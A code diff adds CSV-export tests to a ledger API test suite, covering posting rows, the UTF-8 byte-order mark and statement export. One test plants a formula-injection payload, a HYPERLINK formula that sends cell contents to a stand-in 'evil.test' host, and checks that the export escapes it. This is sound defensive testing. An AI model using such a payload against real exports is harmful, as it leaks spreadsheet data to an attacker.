@@ -802,6 +802,101 @@ describe('API', () => {
     });
   });
 
+  describe('CSV export', () => {
+    it('streams the journal as one row per posting', async () => {
+      const cash = await openAccount('Export cash', 'asset', true);
+      const savings = await openAccount('Export savings', 'asset');
+      await createTransfer(
+        authed('/api/v1/transfers', {
+          description: 'Exported entry',
+          currency: 'USD',
+          fromAccountId: cash.id,
+          toAccountId: savings.id,
+          amount: '12.34',
+        }),
+        noParams,
+      );
+
+      const response = await listEntries(request('/api/v1/entries?format=csv'), noParams);
+      expect(response.status).toBe(200);
+      expect(response.headers.get('content-type')).toContain('text/csv');
+      expect(response.headers.get('content-disposition')).toContain('journal.csv');
+
+      const body = await response.text();
+      const lines = body.trimEnd().split('\r\n');
+      expect(lines[0]).toContain('Debit,Credit');
+      // Two postings, so two rows — a file with one row per entry cannot be
+      // summed or reconciled, which is the only reason to export a journal.
+      expect(lines).toHaveLength(3);
+      expect(body).toContain('Export cash');
+      expect(body).toContain('Export savings');
+    });
+
+    it('opens with a byte-order mark so Excel reads it as UTF-8', async () => {
+      const response = await listEntries(request('/api/v1/entries?format=csv'), noParams);
+      // Asserted over the bytes, not the text: `Response.text()` decodes as
+      // UTF-8 and strips a leading BOM per spec, so a string comparison here
+      // would fail on a file that is in fact correct.
+      const bytes = new Uint8Array(await response.arrayBuffer());
+      expect([bytes[0], bytes[1], bytes[2]]).toEqual([0xef, 0xbb, 0xbf]);
+    });
+
+    it('neutralises a formula hidden in a description', async () => {
+      // The attacker's input channel here is "type an entry description",
+      // which on a ledger is the entire point of the feature.
+      const cash = await openAccount('Formula cash', 'asset', true);
+      const savings = await openAccount('Formula savings', 'asset');
+      await createTransfer(
+        authed('/api/v1/transfers', {
+          description: '=HYPERLINK("http://evil.test/?"&A1,"Click")',
+          currency: 'USD',
+          fromAccountId: cash.id,
+          toAccountId: savings.id,
+          amount: '1.00',
+        }),
+        noParams,
+      );
+
+      const body = await (
+        await listEntries(request('/api/v1/entries?format=csv'), noParams)
+      ).text();
+      expect(body).toContain(`"'=HYPERLINK`);
+      expect(body).not.toContain(',=HYPERLINK');
+    });
+
+    it('exports a statement from the top, ignoring an inbound cursor', async () => {
+      const cash = await openAccount('Statement cash', 'asset', true);
+      const savings = await openAccount('Statement savings', 'asset');
+      for (let i = 0; i < 3; i += 1) {
+        await createTransfer(
+          authed('/api/v1/transfers', {
+            description: `Line ${i}`,
+            currency: 'USD',
+            fromAccountId: cash.id,
+            toAccountId: savings.id,
+            amount: '5.00',
+          }),
+          noParams,
+        );
+      }
+
+      const response = await getStatement(
+        request(`/api/v1/accounts/${cash.id}/statement?format=csv&limit=1`),
+        { params: Promise.resolve({ accountId: cash.id }) },
+      );
+      const lines = (await response.text()).trimEnd().split('\r\n');
+      // The `limit=1` applies to the JSON view; an export is the whole
+      // statement, so all three lines are present plus the header.
+      expect(lines).toHaveLength(4);
+      expect(response.headers.get('content-disposition')).toContain('Statement_cash');
+    });
+
+    it('still answers JSON without the parameter', async () => {
+      const response = await listEntries(request('/api/v1/entries'), noParams);
+      expect(response.headers.get('content-type')).toContain('application/json');
+    });
+  });
+
   describe('observability', () => {
     it('echoes an inbound correlation id on every response', async () => {
       const response = await listAccounts(
